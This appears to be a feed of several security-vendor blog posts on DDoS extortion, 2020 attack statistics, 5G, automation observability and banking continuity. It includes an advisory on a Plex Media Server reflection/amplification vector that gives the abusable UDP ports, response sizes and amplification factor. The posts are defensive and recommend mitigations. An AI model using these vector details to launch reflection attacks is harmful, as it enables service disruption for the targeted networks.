<p>Most DDoS attack vectors and targeting techniques are well-known, which means organizations can prevent an attack by using established DDoS countermeasures and protections. Again, it is best to institute mitigation measures before a threat occurs.</p>

<p>The following steps are recommended:</p>

<ul><li>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural, and operational best current practices (BCPs) have been implemented, including situationally specific network access policies that permit internet traffic only via required IP protocols and ports. Internet access to network traffic from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links.</li>
	<li>Critical supporting ancillary services, such as authoritative DNS, should also be designed, deployed, and operated in a manner consistent with all relevant BCPs.</li>
	<li>Upon receipt of any demands for DDoS extortion payments, targeted organizations should immediately engage with their peers/transit ISPs, other organizations providing critical internet-facing services (such as authoritative DNS hosts), and situationally appropriate law enforcement organizations. They should ensure that their DDoS defense plans are activated and validated, and maintain a vigilant alert posture. </li>
	<li>It also is important to conduct periodic testing of DDoS defenses to ensure that any changes to an organization’s servers/services/applications are incorporated into its defense plan. Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services to ensure maximal responsiveness and flexibility during an attack.</li>
	<li>Organizations should familiarize themselves with the particulars of previous high-profile DDoS extortion campaigns to better prepare for future threats. </li>
</ul><p>As the old saying goes, an ounce of prevention is worth a pound of cure.</p>

  <title>COVID Pandemic Highlights 5G Benefits</title>
  <link>http://localhost:7996/blog/covid-pandemic-highlights-5g-benefits</link>
  <description>As COVID-19 dramatically changed the way we live and work, 5G’s advances have shone even more brightly. In some ways, 5G has been the technology we needed to help cope with this pandemic and its aftermath.</description>
  <content:encoded><![CDATA[<p><em>Authored by Elizabeth Chamberlain and John English</em></p>

<p>The telecom industry has long viewed <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="744de13d-f2f0-4cf4-a971-82c5cf4b50b3" href="http://localhost:7996/solutions/5g" title="Ultra High Definition 5G Visibility">5G</a> as a game-changing technology that would usher in innovative applications such as connected cars, remote surgery, and smart cities. And as 2020 rolled in, it looked as if that promise was starting to unfurl. The world was already on the move with planning, trials, and initial deployments of 5G technology. Both non-standalone (NSA) and standalone (SA) 5G architectures were already beginning to show the expected communications improvements and benefits.</p>

<p>Then the pandemic hit. As COVID-19 dramatically changed the way we live and work, 5G’s advances have shone even more brightly. In some ways, 5G has been the technology we needed to help cope with this pandemic and its aftermath.</p>

<p><strong>5G and the Work-from-Home Imperative</strong></p>

<p>In the early days of the pandemic and its resulting stay-at-home orders, a family of four working and schooling over standard wi-fi would overwhelm the connection. Almost immediately, subscribers started to shop around for better, faster internet service. With the “best” option not available everywhere, some resorted to running multiple home networks—gamers and schoolers on one, and corporate remote workers on another. Consumers started looking for the 5G-capable phones so they could take advantage of hotspots for faster connections. Here the most basic benefit of 5G for the average user was realized: faster connection (higher bandwidth) and lower latency. As a result, applications such as Webex and Zoom conference calls had faster throughput and less quality-destroying jitter and buffering.</p>

<p>Homebound consumers also have delved into the world of the automated connected home, brought to us in a more efficient way via 5G NarrowBand IoT. No need for keys, garage door openers, and manual grocery list making—our lives are voice-activated and -learned routines. Lights, locks, and security are configured and automated; if you have a smart refrigerator, even groceries are ordered, because your refrigerator knows when you are low on staples.</p>

<p>With virus cases spiking across the globe, telehealth visits, pop-up hospitals, and testing centers emerged to help manage the curve. Decentralizing the traditional health care model in this way allowed more people to receive care safely, reserving traditional hospitals for the most-affected patients. Transfers of massive files, images, and other medical content benefit from low-latency characteristics of 5G, allowing doctors and nurses to make time-critical decisions. </p>

<p><strong>Beamforming and Other 5G Benefits</strong></p>

<p>New millimeter-wave 5G radios and edge computing combine to deliver ultra-low latency, high bandwidth, and reliability. A 5G cell site is about the size of a large suitcase and can be more easily installed compared with 4G/LTE. Although the reach of 5G radios is not as far as 4G, being able to concentrate on a smaller area without wasting resources on an unused field can lead to more-efficient deployments. This 5G capability is called <em>beamforming</em>—the ability to concentrate bandwidth over a focused area such as pop-up hospitals, allowing health care workers to quickly adapt, monitor, and change treatments for patients. </p>

<p>As we usher in 2021 with new vaccines and drug therapies for COVID-19, we also are on the cusp of experiencing more 5G benefits, with vendors deploying 5G mobile edge computing (MEC) and network slicing as part of this new Service Based Architecture (SBA). Given the challenges of the COVID-19 pandemic, all the benefits and opportunities provided by 5G technologies are timely. Supply chains, monitoring, health care networks, mobility services, and heightened levels of cybersecurity will be crucial to as the world emerges post pandemic. </p>

  <title>Avoiding Our Own IT Stock Market Crash</title>
  <link>http://localhost:7996/blog/avoiding-our-own-it-stock-market-crash</link>
  <description>In this world of connected, autonomous systems, we need pervasive observability to understand interdependencies, identify emerging anomalous behavior, and retain control.</description>
  <content:encoded><![CDATA[<p>In my recent blog “<a href="https://www.netscout.com/blog/does-automation-really-eliminate-human-error">Does Automation Really Eliminate Human Error</a>?” I wrote about the importance of observability in automated systems to ensure that the “automation” at hand does not rely on flawed programming to produce its results. An automated system, after all, is only as good as the code with which it is built.</p>

<p>In this second blog focused on automated systems, I start with an example from the world of finance to demonstrate how interactions between those systems can yield unforeseen consequences.</p>

<p>On Monday, October 19, 1987, the Dow Jones Industrial Average fell by 22.6 percent and the S&amp;P 500 by 20.4 percent in a single day of trading. When the dust had settled the following day, it’s estimated that $1.7 trillion had been wiped from the value of markets worldwide, with $500 billion lost in the United States alone.</p>

<p>Most observers agree there was a distinct bubble in the markets of early October 1987, and those markets were certainly due a correction. However, many also believe there was a second factor that contributed to the crash: it was the first time there was a significant number of automated trading algorithms in play when a major shift in the markets started.</p>

<p>By 1987, a situation had developed in which market traders were a mix of humans and automated trading algorithms. Each algorithm was developed in isolation to meet a specific goal, but perhaps more importantly, each algorithm was permitted to operate autonomously when interacting with other traders, including other algorithms.</p>

<p>We shouldn’t expect trading algorithms to cooperate and prevent a market crash—their job is to maximize profits and minimize losses for their operators. After all, human traders would behave no differently. Indeed, as the markets started to slide on October 19, the trading algorithms behaved quite logically—and sold heavily.</p>

<p><strong>The Importance of Feedback Loops</strong></p>

<p>In my previous blog, I discussed how automation doesn’t exclude the possibility of human error. However, in the case of the 1987 crash, the problem wasn’t trading algorithms behaving erroneously; it was that the collective result of their interactions hadn’t been fully anticipated. And this is my key point here: as we interconnect systems that were independently designed to complete specific tasks, we should not be surprised if we elicit unexpected outcomes.</p>

<p>The concept of feedback is familiar to all of us: feedback occurs when we create a chain of connections, and the end of the chain is connected back to its start. At this point, we have—either by design or by accident—created a feedback loop.</p>

<p>Negative feedback is an enormously useful mechanism that is present in almost all complex systems, whether mechanical, electrical, software, or natural. For example, negative feedback keeps our drones in the air and our bodies at the correct temperature. By contrast, positive feedback often results in an unstable and undesirable outcome. Most of us have experienced the horrible howling that occurs when a microphone is held too close to the speaker in a public address system.</p>

<p><strong>Understanding Supersystems</strong></p>

<p>In complex systems such as IT environments, it’s increasingly common to allow systems to share data. For example, the owners of System A may decide their system can benefit from information produced by System B. Because most modern systems make such data sharing straightforward, it should be easy to allow System A to ingest and act on data from System B. However, the owners of System A may be blissfully unaware of what else System B is connected to.</p>

<p>It’s therefore important to recognize that whenever we connect two systems together, we are creating a new “supersystem.” If we do not understand how the original systems are already connected to more distant systems, the supersystem we create may be substantially more extensive than we realize. We may even create unanticipated feedback loops.</p>

<p>If we are to truly realize our digital transformation ambitions, we will need to rely on systems running largely autonomously—for example, under the guidance of artificial intelligence operations (AIOps) algorithms. We will also need to allow more and more systems to share data with one another.</p>

<p>It is therefore essential that we design pervasive observability into our IT environments so we can understand the interdependencies between different systems and subsystems, maintain the independent oversight needed to identify emerging anomalous behavior, and retain control, thereby avoiding our own IT stock market crash.</p>

  <title>The Genie Is Out of the Bottle: Business Continuity in a Locked-Down World</title>

  <content:encoded><![CDATA[<p>At the start of 2020, when the word <em>corona</em> was associated primarily with astronomy or alcoholic beverages, digital transformation within the financial services sector was already well underway—driven by, among other things, the need for mobile app provision, the rise of open banking, and the move to hybrid cloud infrastructures. The intervening year has only accelerated this transformation.</p>

<p>The COVID-19 lockdown shut branches, forcing customers online; in fact, it is estimated that <a href="https://www.americanbanker.com/news/digital-banking-is-surging-during-the-pandemic-will-it-last">35 percent of customers have increased their online banking</a> usage during the pandemic. It also created huge obstacles in the daily commute, causing a massive and unprecedented shift to remote work across entire banking staffs. In the U.S., for example, <a href="https://journalnow.com/covid-19-has-corporations-re-thinking-working-from-home/article_c7b60a69-9ec5-524c-ada4-ff26555d07bf.html">Bank of America and Wells Fargo transitioned more than 150,000 employees</a>—or roughly 70 percent of their workforce—to work from home. And in the U.K., <a href="http://www.journalnow.com/business/covid-19-has-corporations-re-thinking-working-from-home/article_c7b60a69-9sec5-524c-ada4-ff26555d07bf.html">Nationwide moved 98 percent of its workers to work from home</a> in the space of just five days.</p>

<p>&nbsp;This is not merely a blip, but rather signs of a permanent change. Customers that have grown accustomed to the speed and convenience of online banking are unlikely to revert to call centers or go back to using an agent or a branch to the same extent as they did previously. And remote work will become far more prevalent. For example, Rabobank, the second-largest Dutch lender, expects employees to <a href="https://www.bloombergquint.com/business/europe-s-banks-get-serious-about-work-from-home-after-pandemic">work from home 40 percent to 50 percent of the time</a>, while Nationwide has <a href="https://fortune.com/2020/05/11/permanent-work-from-home-coronavirus-nationwide-fortune-100/">committed to making its telework changes permanent</a>.</p>

<p><strong>Business Continuity in the New Normal </strong></p>

<p>These changes have massive implications for the financial institutions undergoing them, both from a service assurance and a security perspective.</p>

<p>In the digital world, customer experience is just as important a differentiator as product or price. Any service disruptions will have a massive impact on customer (dis)loyalty. Moreover, employees are disproportionately dependent on online systems. Any problems with the corporate VPN, for example, will bring the entire business grinding to a halt. With stakes that high, it is not surprising to find that companies such as <a href="https://www.scmp.com/business/banking-finance/article/3082352/banks-scramble-patch-systems-enact-workarounds-coronavirus">Standard Chartered have increased VPN capacity by 600 percent</a> over the last year.</p>

<p>This move to a highly dispersed, virtualized environment is a dream scenario for bad actors. Employees that were working on secure corporate infrastructures in a small number of banking premises are now spread across thousands of much- more-vulnerable home office locations. And given the pace with which these new services were put online, many will be “best effort” rather than best; even with the most robust business continuity planning in place, it’s unlikely that tens of thousands of workers can be redeployed within a few days without a few security issues being overlooked in the process.</p>

<p><strong>Reinventing Security and Service Assurance for the Digital Era</strong></p>

<p>The key objective of IT and business leaders now must be to ensure the reliable delivery of mission-critical business services. Financial services institutions cannot function effectively in this new normal unless their customer-facing applications and virtualized business processes can operate reliably and securely across wired and wireless environments—a challenge that the wholesale move to hybrid cloud infrastructures only makes more complex. This continuity mandate has implications for both security and service assurance teams.</p>

<p>For the first time in history, the annual number of observed <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks crossed the 10 million threshold, with NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT) seeing 10,089,687 attacks over the course of 2020. That’s nearly 1.6 million more attacks than 2019’s count of 8.5 million.</p>

<p>Monthly DDoS attacks regularly exceeded 800,000 starting in March, as the pandemic lockdown took effect. Indeed, as noted in the NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report 1H 2020</a>, cybercriminals launched 929,000 DDoS attacks in Ma, which constitutes the single largest number of monthly attacks we’ve ever seen.</p>

<p>With cybercriminals enthusiastically exploiting pandemic vulnerabilities, the need for advanced automated DDoS technology is clear.</p>

<p>Meanwhile, service assurance requirements mean that companies must test and monitor new digital transformation projects over both wired and wireless networks—during and after deployment—to assure a quality user experience. It also requires that companies establish baseline service response times for new and existing services and introduce rapid service triage to reduce the time it takes to identify and remediate any vulnerabilities. Ideally, customized analytics would provide key insights into all business-critical applications and services.</p>

<p>This sounds like an unreachable nirvana, but it can be achieved by ensuring collaboration within IT teams and between those teams and the wider business, and by establishing clear lines of responsibility to avoid finger-pointing between project stakeholders and vendors.</p>

<p><strong>The Network Is the Business </strong></p>

<p>We are only beginning to understand what the post-COVID business landscape will look like, but we can be sure that it will be fundamentally different from its earlier incarnation. When it comes to the growth of online services and remote work, the genie is out of the bottle. More than ever, the distributed network will be the backbone of business service delivery in the financial services sector, and we must ensure it is more secure and performant than ever before.<br />

  <title>Does Automation Really Eliminate Human Error?</title>
  <link>http://localhost:7996/blog/does-automation-really-eliminate-human-error</link>
  <description>Automated systems may behave exactly as requested—but that doesn’t mean the results are error-free. Here’s why maintaining a high level of observability is critical for avoiding the possibly catastrophic consequences of coding errors in the systems themselves.</description>
  <content:encoded><![CDATA[<p>I have lost count of how many times I’ve heard IT professionals state they’ve eliminated human error because they’re using automation. Personally, I believe this is a dangerous assumption, and I will explain why with an example from the world of economics.</p>

<p>In early 2010, two Harvard economists, Carmen Reinhart and Kenneth Rogoff, published the results of analysis they’d performed on the relationship between a country’s debt level and its long-term economic growth. They predicted that if a country’s ratio of debt to gross domestic product (GDP) exceeded 90 percent, then that country’s growth would be negative. Many governments, still grappling with the fallout of the 2008 economic crisis, used this data to launch and justify austerity programs that sought to avoid the 90 percent tipping point predicted by Reinhart and Rogoff.</p>

<p>It took three years before <a href="https://www.newyorker.com/news/john-cassidy/the-reinhart-and-rogoff-controversy-a-summing-up">Reinhart and Rogoff</a> admitted there were errors in their calculations, and the admission occurred only because researchers in Massachusetts couldn’t replicate their results. When the errors were fixed, the predictions were substantially less pessimistic. Many observers subsequently argued that the original, flawed predictions had led to unnecessarily aggressive austerity measures in multiple countries.</p>

<p><strong>‘Exactly as Requested’ Versus Exactly Correct</strong></p>

<p>So, what does this have to do with automation? Well, Reinhart and Rogoff used a very common form of automation to perform their calculations: a Microsoft Excel spreadsheet. You may not think of it this way, but a spreadsheet is a great example of automation: it takes a task that is tedious and error-prone for a human to complete, in this case performing a sequence of mathematical calculations, and performs that same task rapidly and exactly as requested.</p>

<p>One of Reinhart and Rogoff’s errors will be very familiar to regular users of spreadsheets: there was a mistake in the range of a formula. In this case, the spreadsheet was supposed to average data from 19 countries, but in fact it included only 14. This small coding error led to a large error in the overall prediction.</p>

<p>Note that when I described the operation of a spreadsheet, I wrote “exactly as requested” and not “without error.” A spreadsheet will execute the calculations that have been entered without error, but that does not prevent the human who creates the spreadsheet from introducing errors into the equations and formulas. This is a critical distinction—one that naturally leads to the importance of observability and visibility in any automated system.</p>

<p>Observability is a property that enables visibility. Observability represents the degree to which a system’s internal state can be observed and understood, either by way of design or by way of instrumentation and monitoring.</p>

<p><strong>&nbsp;The Importance of Observability and Continuous Monitoring</strong></p>

<p>The vast majority of automated systems in an IT environment ultimately are driven by instructions provided by a human being, via a user interface, a configuration file, or a script. All of these mechanisms allow for the introduction of human error. For example, it’s generally accepted that on average, programmers introduce between 15 and 50 bugs per 1,000 lines of code they write. Of course, most bugs are discovered and fixed through testing, but some inevitably will go undetected. It’s also important to remember that the automation frameworks used in IT systems are themselves implemented as software.</p>

<p>Reinhart and Rogoff declined to share their spreadsheet for review by their peers. This meant there was no observability and no visibility. As a consequence, the effects of their coding errors went undiscovered for three years, arguably with profound effects on the lives of millions of people.</p>

<p>This cautionary tale provides a startling example of how small errors in the programming of an automated system can have far-reaching consequences. It also reinforces the enormous importance of maintaining a high level of observability in automated systems. Such observability, coupled with continuous monitoring, allows organizations to catch errors early and quickly—whether they arise from the programming of the system or exist in the fabric of the system itself.</p>

	<li>Added link to Baidu Labs Chinese-language initial disclosure post.</li>
</ul>

<h2><strong>Changes for Version 1.1 (February 6, 2020):</strong>&nbsp;</h2>

<ul>
	<li>Credited Baidu Labs with initial public disclosure</li>
	<li>Included&nbsp;Plex guidance on circumstances which could facilitate the potential abuse of Plex Media Server instances in reflection/amplification DDoS attacks, along with guidance on remediation</li>

	<li>Updated number of abusable PMSSDP reflectors/amplifiers</li>
	<li>Cited observed number of PMSSDP attacks observed to date, along with number of PMSSDP reflectors/amplifiers leveraged.</li>
</ul>

<h1>Overview</h1>

<p>Plex Media Server is a personal media library and streaming system which runs on modern Windows, macOS, and Linux operating systems, along with variants customized for special-purpose platforms such as network-attached storage (NAS) devices, external RAID storage units, digital media players, etc.</p>

<p>Upon startup, Plex probes the local network using the G’Day Mate (GDM) network/service discovery protocol to locate other compatible media devices and streaming clients. It also appears to make use of SSDP probes to locate UPnP gateways on broadband Internet access routers which have SSDP enabled; when a UPnP gateway is discovered via this methodology, Plex attempts to utilize NAT-PMP to instantiate dynamic NAT forwarding rules on the broadband Internet access router. &nbsp;</p>

<p>On January 7, 2021 Baidu Labs, in a Chinese-language weblog post, described a UDP reflection/amplification DDoS attack vector leveraging Plex Media Server instances running versions of the Plex software prior to 1.21. In early February 2021, NETSCOUT Arbor were notified that reflection/amplification DDoS attacks which appeared to leverage abusable Plex Media Server instances were actively taking place on the public Internet.</p>

<p>According to an announcement published on Plex’s Web site on February 5, 2020 Plex Media Server instances which have either been deployed on a public-facing network DMZ or in an Internet Data Center (IDC), or with manually configured port-forwarding rules which forward specific UDP ports from the public Internet to devices running Plex Media Server, can potentially be abused as part of possible <a href="https://www.netscout.com/what-is-ddos">DDoS attacks</a>.</p>

<p>These actions can have the effect of exposing a Plex UPnP-enabled service registration responder to the general Internet, where it can be abused to generate <a href="https://www.netscout.com/what-is-ddos/what-is-reflection-amplification-attack">reflection/amplification DDoS attacks</a>. In order to differentiate this particular attack vector from generic SSDP reflection/amplification, it has been designated as Plex Media SSDP (PMSSDP) reflection/amplification. To date, approximately 37,000 abusable PMSSDP reflectors/amplifiers have been identified on the public internet.</p>

<p>Amplified PMSSDP DDoS attack traffic consists of SSDP HTTP/U responses sourced from ports UDP port 32414 and/or UDP port 32410 on abusable Plex Media Server instances and directed towards attack target(s); each amplified response packet ranges from 52 bytes – 281 bytes in size, for an average amplification factor of ~4.68:1. &nbsp;</p>

<p>Observed single-vector PMSSDP reflection/amplification DDoS attacks range in size from ~2 Gbps – ~3 Gbps; multi-vector (2–10 vectors) and omni-vector (11 or more vectors) attacks incorporating PMSSDP range from the low tens of Gbps up to 218 Gbps. As is routinely the case with newer DDoS attack vectors, it appears that after an initial period of employment by advanced attackers with access to bespoke DDoS attack infrastructure, PMSSDP has been weaponized and added to the arsenals of so-called booter/stresser DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<p>To date, more than 5,500 PMSSDP reflection/amplification DDoS attacks have been observed on the public Internet, leveraging approximately 15,000 distinct abusable PMSSDP reflectors/amplifiers.</p>

<p>It should be noted that a single-vector PMSSDP reflection/amplification attack of ~2 Gbps – ~3 Gbps in size is often sufficient to have a significant negative impact on the availability of targeted networks/servers/services. The incidence of both single-vector and multi-/omni-vector reflection/amplification attacks leveraging PMSSDP has increased significantly since November of 2020, indicating its perceived utility to attackers.</p>

<h1>Collateral Impact&nbsp;</h1>

<p>The collateral impact of PMSSDP reflection/amplification attacks is potentially significant for broadband Internet access operators whose end-customers have inadvertently exposed PMSSDP reflectors/amplifiers to the public internet. This may include partial or full interruption of end-customer broadband Internet access, as well as additional service disruption due to access/distribution/aggregation/core/peering/transit link capacity consumption.</p>

<p>Wholesale filtering of all UDP port 32414- and/or UDP port 32410-sourced traffic by network operators may potentially overblock legitimate Internet traffic. &nbsp;</p>

<h1>Mitigating Factors</h1>

<p>On February 7, 2020 Plex posted a hotfix update to Plex Media Server which prevents its abuse for the purpose of launching reflection/amplification DDoS attacks across the public Internet, as well as a new version of PMS which incorporates this remediation.&nbsp;</p>

<p>Collateral impact to abusable PMSSDP reflectors/amplifiers can alert network operators and/or end-customers to remove Plex Media Server instances from DMZ networks or IDCs, or to disable relevant UDP port-forwarding rules which forward specific UDP ports from the public Internet to devices running Plex Media Server, thereby preventing them from being abused in PMSSDP reflection/amplification attacks. &nbsp;</p>

<p>Prior to device remediation, quarantine of abusable end-customer nodes and/or filtering traffic directed towards UDP port 32414 and/or UDP port 32410 on abusable nodes only may also implemented, where feasible.</p>

<h1>Recommended Actions</h1>

<p>It is strongly recommended that operators of Plex Media Server instances implement the Plex-supplied hotfix as soon as is practicable, taking into account situationally appropriate best current practices (BCPs) with regards to pre-upgrade backups, testing and validation of new software updates and versions, etc.</p>

<p>Network operators should perform reconnaissance to identify and quarantine or remediate abusable PMSSDP reflectors/amplifiers on their networks and/or the networks of their customers. It is strongly recommended that SSDP be disabled by default on operator-supplied broadband Internet access CPE, and that guidance on disabling SSDP on common CPE makes/models be supplied to end-customers.</p>

<p>All relevant network infrastructure, architectural and operational Best Current Practices (BCPs) should be implemented by network operators.</p>

<p>Organizations with business-critical public-facing Internet properties should ensure that all relevant network infrastructure, architectural and operational Best Current Practices (BCPs) have been implemented, including situationally specific network access policies which only permit Internet traffic via required IP protocols and ports. Internet access network traffic from internal organizational personnel should be deconflated from Internet traffic to/from public-facing Internet properties and served via separate upstream Internet transit links. &nbsp;</p>

<p>DDoS defenses for all public-facing Internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Both organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing Internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack, and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources; the relevant NETSCOUT Arbor account teams and/or ATAC may be consulted with regards to optimal countermeasure selection and employment.</p>

  <title>What Is a DDoS Extortion Attack? </title>
  <link>http://localhost:7996/blog/what-ddos-extortion-attack</link>
  <description>Also known as ransom DDoS (RDDoS) attacks, DDoS extortion attacks occur when cybercriminals threaten individuals or organizations with a DDoS incursion unless an extortion demand is paid. These demands call for payment in cryptocurrency in order to avoid traceability by law enforcement authorities.</description>
  <content:encoded><![CDATA[<p>With massive disruption from the COVID-19 pandemic forcing businesses and public organizations alike to shift to a work-from-home posture, bad actors seized the opportunity to launched unprecedented numbers of <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS) </a>attacks. These attacks included an DDoS extortion attack campaign known as <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">Lazarus Bear Armada</a>, which was launched by a group of bad actors starting in mid-August of 2020.</p>

<p><strong>What Is a DDoS extortion attack?</strong></p>

<p>Also known as ransom DDoS (RDDoS) attacks, DDoS extortion attacks occur when cybercriminals threaten individuals or organizations with a DDoS incursion unless an extortion demand is paid. These demands call for payment in cryptocurrency in order to avoid traceability by law enforcement authorities.</p>

<p>DDoS extortion/RDDoS attacks should not be confused with <a href="https://www.netscout.com/blog/five-similarities-between-ddos-and-ransomware-attacks">ransomware attacks</a>, in which malicious software encrypts an organization’s systems and databases, preventing legitimate owners and users from accessing them until the ransom is paid.</p>

<p><strong>What are the signs of a DDoS extortion attack?</strong></p>

<p>Threat actors behind DDoS extortion campaigns use several methods. Some attacks start with a demonstrative DDoS attack that targets a specific element of an organization’s online services/application delivery infrastructure to prove the threat is real. This limited attack is immediately followed up with an extortion note or email threatening that a larger attack will follow if payment is not made.</p>

<p>Other attacks first send an extortion note or email that outlines the threat to the business and sets the extortion demand, payment form, and deadline for payment before the attack is launched. The attackers often claim they have upwards of 3 Tbps of DDoS attack capacity available if demands are not met.</p>

<p>Attackers may not always launch the threatened attacks, and some may not even have the capacity to do so, However, organizations should not rely on the assumption of empty threats. </p>

<p>DDoS extortion attacks often involve one or more of the following vectors:</p>

	<li>TCP ACK-floods</li>
	<li>TCP reflection/amplification attacks</li>
	<li>IPv4 protocols launching packet-flooding attacks</li>
</ul><p>As is true with all DDoS attacks once initiated, attacks combined with DDoS extortion target an application or service, overwhelming it with attack traffic that ultimately slows or crashes the service completely.</p>

<p><strong>Why are DDoS extortion attacks dangerous?</strong></p>

<p>Like any DDoS attack, a DDoS extortion attack prevents legitimate network requests from getting through, which can disrupt operations, cost money, and harm business reputation. Conventional wisdom states that paying the extortion demand is not advisable because there is no guarantee the attackers won’t return to demand additional payments in the future </p>

<p>With the exception of those cases in which a demonstration attack takes place first, it is difficult to know whether the threat is legitimate. Attackers may claim affiliation with well-known attack groups that have already received media coverage in order to lend credibility to the attack threat. Because many security professionals have heard of major attacks by groups such as “Armada Collective,” high jacking the name is believed to heighten the urgency of the threat, thus compelling the target to make payment. It’s important to note that copycat threats still may be real.</p>

<p>More often than not, cyberattackers have conducted preattack reconnaissance before issuing their threat. This type of probing looks for weak spots to exploit, such as inadequately protected public-facing applications and services. Sometimes, the attacks target upstream transit providers. By attacking ISPs supplying internet connectivity, attackers can cause targeted organizations to experience significant disruption.</p>

<p>Authorities recommend that organizations not pay the extortion, because there is no guarantee subsequent demands won’t occur. But it is advisable to put strong DDoS mitigation measures in place to prevent attackers from making good on the threat. If the cybercriminals are unable to conduct the attack because of preventive measures, then the threats are essentially neutralized.</p>

  <title>Crossing the 10 Million Mark: DDoS Attacks in 2020</title>
  <link>http://localhost:7996/blog/asert/crossing-10-million-mark-ddos-attacks-2020</link>
  <description>For the first time, we observed DDoS attacks rise above 10 million annually in 2020, nearly 1.6 million more attacks than seen in 2019.</description>
  <content:encoded><![CDATA[<h1>DDoS Attacks in 2020</h1>

<p>Not all world records are cause for celebration—just look at the DDoS attack numbers from 2020. For the first time in history, we observed more than 10 million DDoS attacks in a single year, with NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT) observing 10,089,687 attacks over the course of the year. That’s nearly 1.6 million more attacks than 2019’s count of 8.5 million. </p>

<p>Granted, DDoS attack numbers move only in one direction—up. But context is important when looking at DDoS statistics from 2020. From March until the end of the year, DDoS attackers operated amidst the COVID-19 pandemic. While most of the world saw an unprecedented global health crisis, malicious actors saw new vulnerabilities and opportunity. It is seldom that annual activity is so deeply affected by one event, but such is the case with 2020 DDoS attack activity and trends. It is no coincidence that this milestone number of global attacks comes at a time when businesses have relied so heavily on online services to survive.</p>

<p>The start of the pandemic lockdown ushered in a “new normal” in the way we live and work, causing a seismic shift in internet usage as people increasingly moved their lives online. As the global workforce shifted to remote work, devices that previously sat behind enterprise firewalls and secure environments were used at home, behind typical consumer-grade routers and network devices. Attacks quickly exploited this by more than doubling the number of IoT-specific malware samples circulating in the wild, further contributing to the increase in DDoS attacks for 2020.</p>

<p>DDoS attack count, bandwidth, and throughput all saw <a href="https://www.netscout.com/blog/asert/measuring-cruellest-month">significant increases</a> between the start of the global COVID-19 pandemic and the end of the year.</p>

<p>For instance, attack frequency rose 20 percent year over year, but that includes the pre-pandemic months of January, February, and most of March. For the second half of 2020, which was entirely pandemic-ridden, attacks rose 22 percent year over year. </p>
<figure role="group" class="caption caption-img align-center"><img alt="Attack Frequency" data-entity-type="file" data-entity-uuid="ddd3550f-fa74-4c10-9be4-6d6ada5d1f06" src="http://localhost:7996/sites/default/files/inline-images/Attack%20Frequency%20Chart-01.png" /><figcaption>Figure 1: Attack Frequency Chart</figcaption></figure><p> </p>

<p>As cybercriminals quickly exploited pandemic-driven opportunities, we saw another kind of “new normal.” Monthly DDoS attacks regularly exceeded 800,000 starting in March, as the pandemic lockdown took effect. Indeed, as noted in the NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report 1H 2020</a>, cybercriminals launched 929,000 DDoS attacks in May, which constitutes the single largest number of monthly attacks we’ve ever seen. And although wired and wireless broadband providers experienced the brunt of the attacks, pandemic lifeline industries such as ecommerce, <a href="https://www.netscout.com/blog/threat-actors-target-remote-learning-during-covid-19">online learning</a>, and healthcare all experienced increased attention from malicious actors. For example, ASERT conducted a six-month review of worldwide education networks for DDoS activity and found a 25 percent increase year over year for that time period. </p>

<h1>DDoS Cyber Extortion Campaign</h1>

<p>The other notable DDoS activity of 2020 started in mid-August, as a relatively prolific threat actor initiated the <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">Lazarus Bear Armada (LBA) global campaign</a> of DDoS extortion attacks, a campaign that remains active as adversaries have begun retargeting original victims. The adversary cites the victim’s failure to pay the original extortion demand as the cause for renewed attacks. </p>

<p>Here, too, the exigencies of the pandemic likely influenced the attackers’ targets. Whereas the LBA campaign originally focused on financial services targets, the actors behind the campaign soon expanded their target area to include larger enterprises within the healthcare space, including insurers, medical testing companies, and global pharmaceutical companies. Some of these businesses were involved in COVID-19 testing and vaccine development. Although it is doubtful that the attackers aimed specifically to disrupt the work, the fact that these companies had both deep pockets and urgent deadlines made them prime targets.</p>

<p>Communications service providers, ISPs, large technology companies, and manufacturing also came under increased attack.<br />
Moreover, the attackers targeted infrastructure in addition to more conventional attacks focused on internet-facing services. Here too, pandemic accommodations such as remote work played a role: the cybercriminals focused on disrupting ongoing operations within a company, such as the inbound/outbound use of <a href="https://www.netscout.com/blog/asert/availability-time-covid-19">VPNs</a> and cloud-based tools by employees working from home. </p>

<h1>Conclusion</h1>

<p>As the COVID-19 pandemic extends into 2021, we can logically expect to see threat actors targeting vulnerabilities exposed by the global crisis as well as discovering and using new attack vectors that <a href="https://www.netscout.com/blog/asert/microsoft-remote-desktop-protocol-rdp-reflectionamplification">poke at the weak spots</a> of our new normal. Indeed, these numbers only scratch the surface, and we expect to unearth new details as we conduct further research for the next <a href="https://www.netscout.com/threatreport">NETSCOUT Threat Intelligence Report</a>. It is imperative that defenders and security professionals remain vigilant to protect the critical infrastructure that connects and enables the modern world. NETSCOUT's <a href="https://horizon.netscout.com/?atlas=summary&amp;y=2020">Cyber Threat Horizon</a> gives a real-world picture of these DDoS attacks as they occur in near real-time and provides a view into the DDoS Threat Landscape.</p>

  <title>Service Provider DDoS Attacks Are on the Rise</title>
  <link>http://localhost:7996/blog/service-provider-ddos-attacks-are-rise</link>
